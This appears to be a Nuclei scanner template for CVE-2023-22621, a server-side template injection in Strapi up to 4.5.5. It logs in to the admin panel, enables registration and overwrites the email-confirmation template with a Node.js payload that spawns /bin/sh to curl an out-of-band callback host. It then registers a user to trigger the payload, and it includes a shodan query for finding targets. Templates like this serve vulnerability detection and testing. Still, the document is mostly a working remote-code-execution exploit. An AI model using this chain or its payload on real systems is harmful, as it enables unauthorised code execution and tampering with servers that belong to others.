flow: http(1) && http(2) && http(3) && http(4)
http:
- extractors:
  - internal: true
    json:
    - .data.token
    name: token
    part: body
    type: json
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "token","isActive")
    - contains(content_type, "application/json")
    internal: true
    type: dsl
  raw:
  - 'POST /admin/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"email":"{{email}}","password":"{{password}}"}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "ok","true")
    - contains(content_type, "application/json")
    internal: true
    type: dsl
  raw:
  - 'PUT /users-permissions/advanced HTTP/1.1

    Host: {{Hostname}}

    Authorization: Bearer {{token}}

    Content-Type: application/json


    {"unique_email":true,"allow_register":true,"email_confirmation":true,"email_reset_password":null,"email_confirmation_redirection":"{{RootURL}}","default_role":"authenticated"}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "ok","true")
    - contains(content_type, "application/json")
    internal: true
    type: dsl
  raw:
  - "PUT /users-permissions/email-templates HTTP/1.1\nHost: {{Hostname}}\nAuthorization:\
    \ Bearer {{token}}\nContent-Type: application/json\n\n{\n  \"email-templates\"\
    : {\n    \"reset_password\": {\n      \"display\": \"Email.template.reset_password\"\
    ,\n      \"icon\": \"sync\",\n      \"options\": {\n        \"from\": {\n    \
    \      \"name\": \"Administration Panel\",\n          \"email\": \"no-reply@strapi.io\"\
    \n        },\n        \"response_email\": \"\",\n        \"object\": \"Reset password\"\
    ,\n        \"message\": \"<p>We heard that you lost your password. Sorry about\
    \ that!</p>\\n\\n<p>But dont worry! You can use the following link to reset your\
    \ password:</p>\\n<p><%= URL %>?code=<%= TOKEN %></p>\\n\\n<p>Thanks.</p>\"\n\
    \      }\n    },\n    \"email_confirmation\": {\n      \"display\": \"Email.template.email_confirmation\"\
    ,\n      \"icon\": \"check-square\",\n      \"options\": {\n        \"from\":\
    \ {\n          \"name\": \"Administration Panel\",\n          \"email\": \"no-reply@strapi.io\"\
    \n        },\n        \"response_email\": \"\",\n        \"object\": \"Account\
    \ confirmation\",\n        \"message\": \"<%= `${ process.binding('spawn_sync').spawn({\\\
    \"file\\\":\\\"/bin/sh\\\",\\\"args\\\":[\\\"/bin/sh\\\",\\\"-c\\\",\\\"curl {{interactsh-url}}\\\
    \"],\\\"stdio\\\":[{\\\"readable\\\":1,\\\"writable\\\":1,\\\"type\\\":\\\"pipe\\\
    \"},{\\\"readable\\\":1,\\\"writable\\\":1,\\\"type\\\":\\\"pipe\\\"/*<>%=*/}]}).output\
    \ }` %>\\n\\n<p><%= URL %>?confirmation=<%= CODE %></p>\\n\\n<p>Thanks.</p>\"\n\
    \      }\n    }\n  }\n}\n"
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - ApplicationError
  - part: content_type
    type: word
    words:
    - application/json
  matchers-condition: and
  raw:
  - "POST /api/auth/local/register HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n    \"email\": \"{{address}}\",\n    \"username\": \"{{randstr_1}}\",\n \
    \   \"password\": \"{{randstr_2}}\"\n}\n"
id: CVE-2023-22621
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:strapi:strapi:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-22621
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cwe-id: CWE-74
    epss-percentile: 0.79886
    epss-score: 0.00654
  description: 'Strapi through 4.5.5 allows authenticated Server-Side Template Injection
    (SSTI) that can be exploited to execute arbitrary code on the server. A remote
    attacker with access to the Strapi admin panel can inject a crafted payload that
    executes code on the server into an email template that bypasses the validation
    checks that should prevent code execution.

    '
  metadata:
    max-request: 4
    product: strapi
    shodan-query: html:"Welcome to your Strapi app"
    vendor: strapi
    verified: true
  name: Strapi Versions <=4.5.5 - SSTI to Remote Code Execution
  reference:
  - https://github.com/strapi/strapi/releases
  - https://github.com/sofianeelhor/CVE-2023-22621-POC
  - https://github.com/strapi/security-patches
  - https://github.com/ARPSyndicate/cvemon
  - https://nvd.nist.gov/vuln/detail/CVE-2023-22621
  severity: high
  tags: cve,cve2023,strapi,ssti,rce,intrusive,authenticated
variables:
  address: '{{randstr}}@{{rand_base(5)}}.com'
  email: '{{email}}'
  password: '{{password}}'
